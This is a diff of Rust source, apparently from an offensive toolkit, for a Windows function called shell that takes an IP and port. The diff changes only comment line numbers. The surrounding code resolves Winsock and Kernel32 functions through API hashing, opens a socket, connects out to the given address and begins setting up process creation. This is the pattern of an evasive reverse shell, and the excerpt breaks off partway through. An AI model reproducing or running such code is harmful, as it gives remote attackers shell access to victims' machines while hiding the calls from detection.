@@ -11,7 +11,7 @@ use windows::Win32::System::Threading::{PROCESS_CREATION_FLAGS, PROCESS_INFORMAT
 const WSASTARTUPVAL: u16 = 514;
 
 pub fn shell(ip: &str, port: u16) {
-    // See line 17
+    // See line 15
     let function = rco_utils::find_function_address("Ws2_32", 0xedf45b56dba24418).unwrap();
     let function = rco_utils::construct_win32_function!(function; [u16, &mut WSAData]; [()]);
     unsafe { function(
@@ -19,7 +19,7 @@ pub fn shell(ip: &str, port: u16) {
         &mut WSAData::default()
     ) };
 
-    // See line 30
+    // See line 28
     let function = rco_utils::find_function_address("Ws2_32", 0xad51563d572a6798).unwrap();
     let function = rco_utils::construct_win32_function!(function; [i32, i32, i32, *const WSAPROTOCOL_INFOA, i32, i32]; [SOCKET]);
     let socket = unsafe { function(
@@ -31,7 +31,7 @@ pub fn shell(ip: &str, port: u16) {
         0
     ) };
 
-    // See line 44
+    // See line 42
     let function = rco_utils::find_function_address("Ws2_32", 0xf6d69fad519d46a0).unwrap();
     let mut sockaddr_in = SOCKADDR_IN {
         sin_family: AF_INET.0 as u16,
@@ -49,14 +49,14 @@ pub fn shell(ip: &str, port: u16) {
         sin_addr_ptr
     ) };
 
-    // See line 70
+    // See line 68
     let function = rco_utils::find_function_address("Ws2_32", 0x57420f0d05112fd1).unwrap();
     let function = rco_utils::construct_win32_function!(function; [u16]; [u16]);
     sockaddr_in.sin_port = unsafe { function(
         port
     ) };
 
-    // See line 79
+    // See line 77
     let function = rco_utils::find_function_address("Ws2_32", 0xcbfa974b4e43f414).unwrap();
     let function = rco_utils::construct_win32_function!(function; [SOCKET, *const SOCKADDR, i32]; [i32]);
     unsafe { function(
@@ -66,7 +66,7 @@ pub fn shell(ip: &str, port: u16) {
     ) };
     
 
-    // See line 93
+    // See line 91
     let function = rco_utils::find_function_address("Kernel32", 0x9822936f60f9a914).unwrap();
     let lp_buffer: &mut [u8] = &mut [0; 50];
     let function = rco_utils::construct_win32_function!(function; [&mut [u8]]; [()]);
@@ -76,7 +76,7 @@ pub fn shell(ip: &str, port: u16) {
     let system_dir = unsafe { CStr::from_ptr(lp_buffer.as_ptr() as *const i8) };
     let system_dir = system_dir.to_str().unwrap();
 
-    // See line 105
+    // See line 103
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
     let mut startup_info = STARTUPINFOA {
         cb: mem::size_of::<STARTUPINFOA>() as u32,
